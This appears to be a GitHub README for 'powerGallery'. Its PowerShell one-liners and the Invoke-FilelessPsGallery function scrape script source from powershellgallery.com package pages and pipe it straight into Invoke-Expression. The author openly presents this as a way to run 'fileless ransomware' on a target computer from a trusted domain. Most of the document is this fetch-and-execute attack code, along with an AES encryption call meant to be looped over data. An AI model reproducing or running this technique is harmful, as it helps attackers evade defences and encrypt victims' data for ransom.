# powerGallery

This one liner will load the neccessary files to encrypt a system straight from the trusted powershellgallery.com website.
Used in conjunction with a simple for loop its is now fileless ransomware hosted and executed from your platform

```powershell
([regex]::Matches((irm "https://www.powershellgallery.com/packages/PSAES/1.0.0.5/Content/Protect-AESMessage.ps1"),'(?<=<td class="fileContent .*?">).*?(?=<\/td>)','s').Value|%{[System.Net.WebUtility]::HtmlDecode($_)})-replace'<[^>]*>'-replace'^\s*',''-replace '[^\x20-\x7E]'|iex
```

Next its as simple as running the commands stored in that module agaisnt the system
In this instance we can encrypt a string, but why stop there? 

```powershell
$encryptedMessage = Protect-AESMessage -Message "Sensitive Data" -Password "89c57yj78754cth8"
```

Combining them into a simple one liner. Together with yet another simple functionality the `for loop` you should be able to see the danger
We could run fileless ransomware on a target computer all from a trusted source

```powershell
([regex]::Matches((irm "https://www.powershellgallery.com/packages/PSAES/1.0.0.5/Content/Protect-AESMessage.ps1"),'(?<=<td class="fileContent .*?">).*?(?=<\/td>)','s').Value|%{[System.Net.WebUtility]::HtmlDecode($_)})-replace'<[^>]*>'-replace'^\s*',''-replace '[^\x20-\x7E]'|iex;$encryptedMessage = Protect-AESMessage -Message "Sensitive Data" -Password "89c57yj78754cth8"
```

# Get Current Version

```powershell
# Define the regex pattern to extract content from <h2> within the specified <article> class
$pattern = '<article class="col-sm-12 col-md-8 package-details-main special-margin-left">.*?<h2>(.*?)</h2>'

# Perform the regex match
$match = [regex]::Match($html, $pattern, [System.Text.RegularExpressions.RegexOptions]::Singleline)

# Extract the value
if ($match.Success) {
    $h2Content = $match.Groups[1].Value.Trim()
    # Output the content of the <h2> tag
    $h2Content
} else {
    "No <h2> tag found within the specified <article> class."
}
```


You can use this function to grab the links of all the .ps1 files in a module from the powershell gallery website
## FUNCTION NOT CURRENTLY WORKING, USE THIS SCRIPT INSTEAD OF THE FUNCTION

```powershell
$module = 'PsAES'
$mod = "https://www.powershellgallery.com/packages/$module"
$content = Invoke-RestMethod -Uri $mod
$regex = '<a\s+[^>]*href="([^"]+\.ps1)"[^>]*>'
$matches = [regex]::Matches($content, $regex)
$baseURL = "https://www.powershellgallery.com"
foreach ($match in $matches) {
$relativeLink = $match.Groups[1].Value
$fullLink = $baseURL + $relativeLink
([regex]::Matches((irm "$fullLink"), '(?<=<td class="fileContent .*?">).*?(?=<\/td>)', 's').Value|%{[System.Net.WebUtility]::HtmlDecode($_)})-replace'<(?!#)[^>]+>|(?<!<#)>(?![^#])',''|iex}
```

```powershell
function Invoke-FilelessPsGallery {
    param ([string]$module)
    try {

        $mod = "https://www.powershellgallery.com/packages/$module"
        write-host "--> $mod"
        
        $content = Invoke-RestMethod -Uri $mod
        $regex = '<a\s+[^>]*href="([^"]+\.ps1)"[^>]*>'
        $matches = [regex]::Matches($content, $regex)
        $baseURL = "https://www.powershellgallery.com"
        $ps1Links = @()
        foreach ($match in $matches) {
            $relativeLink = $match.Groups[1].Value
            $fullLink = $baseURL + $relativeLink
            $ps1Links += $fullLink
        }
        #return $ps1Links
        foreach ($url in $ps1Links){([regex]::Matches((irm "$url"), '(?<=<td class="fileContent .*?">).*?(?=<\/td>)', 's').Value|%{[System.Net.WebUtility]::HtmlDecode($_)})-replace'<(?!#)[^>]+>|(?<!<#)>(?![^#])',''|iex}
    }
    catch {
        Write-Error "An error occurred: $_"
    }
}
```

Syntax:

```powershell
$urls = get-Ps1Urls -Url "https://www.powershellgallery.com/packages/PSAES/1.0.0.5"
```


```powershell
$urls = @("https://www.powershellgallery.com/packages/PSAES/1.0.0.5/Content/Protect-AESMessage.ps1")

foreach ($url in $urls){([regex]::Matches((irm "$url"), '(?<=<td class="fileContent .*?">).*?(?=<\/td>)', 's').Value|%{[System.Net.WebUtility]::HtmlDecode($_)})-replace'<(?!#)[^>]+>|(?<!<#)>(?![^#])',''|iex}
```











